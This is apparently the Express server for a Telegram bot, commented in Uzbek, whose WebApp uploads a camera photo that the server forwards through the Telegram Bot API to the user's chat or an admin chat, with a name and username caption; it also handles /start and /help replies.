const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");
const { config } = require("dotenv");
const bodyParser = require("body-parser");

config();
const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL; // masalan: https://your-site.com
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const PORT = process.env.PORT || 3000;
const upload = multer({ storage: multer.memoryStorage() });

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));


// 1️⃣ WEBAPP HTML PAGE
app.get("/", (_, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

// 2️⃣ RASMLARNI QABUL QILISH VA TELEGRAMGA YUBORISH
app.post("/send-photo", upload.single("photo"), async (req, res) => {
  const { user_id, tg_fullname, tg_username } = req.body;
  const buffer = req.file?.buffer;

  if (!buffer) return res.status(400).json({ error: "No image sent" });

  const tgForm = new FormData();
  tgForm.append("chat_id", user_id || process.env.ADMIN_CHAT_ID);
  tgForm.append("photo", buffer, {
    filename: "photo.png",
    contentType: "image/png"
  });

  if (user_id && tg_fullname && tg_username) {
    const caption = `
🧑‍💻 <b>Foydalanuvchi:</b>
Ism: ${tg_fullname}
Username: @${tg_username}
ID: ${user_id}`.trim();

    tgForm.append("caption", caption);
    tgForm.append("parse_mode", "HTML");
  }

  try {
    await axios.post(`${TELEGRAM_API}/sendPhoto`, tgForm, {
      headers: tgForm.getHeaders()
    });
    console.log("✅ Rasm yuborildi");
    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Telegramga yuborilmadi:", err.message);
    res.status(500).json({ error: "Telegram xatolik" });
  }
});

// 3️⃣ TELEGRAM BOT WEBHOOK
app.post("/webhook", async (req, res) => {
  const msg = req.body.message;
  if (!msg || !msg.text) return res.sendStatus(200);

  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === "/start") {
    const keyboard = {
      inline_keyboard: [[
        {
          text: "📲 WebApp'ga kirish",
          web_app: { url: WEBAPP_URL }
        }
      ]]
    };

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text: "👋 Salom! WebApp'ga kirish uchun tugmani bosing:",
      reply_markup: keyboard
    });
  } else if (text === "/help") {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text: "ℹ️ Ushbu bot kamerani ishga tushiradi va rasm yuboradi."
    });
  } else {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text: "🤖 Noma'lum komanda. /start yuboring."
    });
  }

  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`🚀 Server ishga tushdi: http://localhost:${PORT}`);
});
